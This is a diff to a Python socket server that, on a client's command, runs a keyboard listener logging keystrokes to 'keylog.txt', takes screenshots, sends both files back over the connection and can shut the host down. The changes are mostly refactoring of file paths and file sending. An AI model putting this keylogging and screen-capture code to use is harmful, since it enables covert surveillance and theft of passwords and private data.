@@ -32,7 +32,8 @@ BUFFER_SIZE = 1024
 TMP_PATH = os.path.join(os.getcwd(), 'tmp')
 
 #LOGGING
-logging.basicConfig(filename=(os.path.join(TMP_PATH, "keylog.txt")), level=logging.INFO, format='%(asctime)s: %(message)s', encoding='utf-8' )
+LOG_FILE = "keylog.txt"
+logging.basicConfig(filename=(os.path.join(TMP_PATH, LOG_FILE)), level=logging.INFO, format='%(asctime)s: %(message)s', encoding='utf-8' )
 
 
 class Server:
@@ -44,7 +45,6 @@ class Server:
     self.server.bind(self.addr)
     self.keylogger_listener = None
     
-
   def run(self):
     self.server.listen(5)
     print(f'Server is listening on {self.host}:{self.port}')
@@ -75,7 +75,7 @@ class Server:
         # Take screenshot
         elif data == CMD_TAKE_SCREENSHOT.encode():
           print(f'[SCREENSHOT] {addr} requested screenshot.')
-          self.take_screenshot()
+          self.take_screenshot(os.path.join(TMP_PATH, 'screenshot.png'))
           self.send_file(os.path.join(TMP_PATH, 'screenshot.png'), conn)
           print(f'[SCREENSHOT] {addr} sent screenshot.')
 
@@ -128,7 +128,7 @@ class Server:
         # Print keylogger
         elif data == CMD_PRINT_KEYLOGGER.encode():
           print(f'[KEYLOGGER] {addr} requested print keylogger.')
-          self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)
+          self.send_file(os.path.join(TMP_PATH, LOG_FILE), conn)
           print(f'[KEYLOGGER] {addr} sent keylogger.')
 
         # View apps
@@ -170,13 +170,25 @@ class Server:
     conn.close()
     os.system('shutdown -s -t 0')
     
-  def take_screenshot(self):
+  def take_screenshot(self, file):
     screenshot = pyautogui.screenshot()
-    screenshot.save(os.path.join(TMP_PATH, 'screenshot.png'))
-  
+    screenshot.save(file)
+    # screenshot.save(os.path.join(TMP_PATH, 'screenshot.png'))
+
   def send_file(self, path, conn):
     if os.path.exists(path):
       f = open(path, 'rb')
+      bytes = f.read(BUFFER_SIZE)
+      while bytes:
+        conn.send(bytes)
+        bytes = f.read(BUFFER_SIZE)
+      time.sleep(0.05)
+      f.close()
+      conn.send(FLAG_FILE_END.encode())
+  
+  def send_tmp_file(self, file, conn):
+    if (os.path.exists(file.name)):
+      f = open(file.name, 'rb')
       bytes = f.read(BUFFER_SIZE)
       while bytes:
         conn.send(bytes)
@@ -222,7 +234,7 @@ class Server:
     print("Running keylogger...")
     self.keylogger_listener = keyboard.Listener(on_press=self.on_press)
     self.keylogger_listener.start()
-   
+
   def stop_keylogger(self):
     print("Stopping keylogger...")
     self.keylogger_listener.stop()
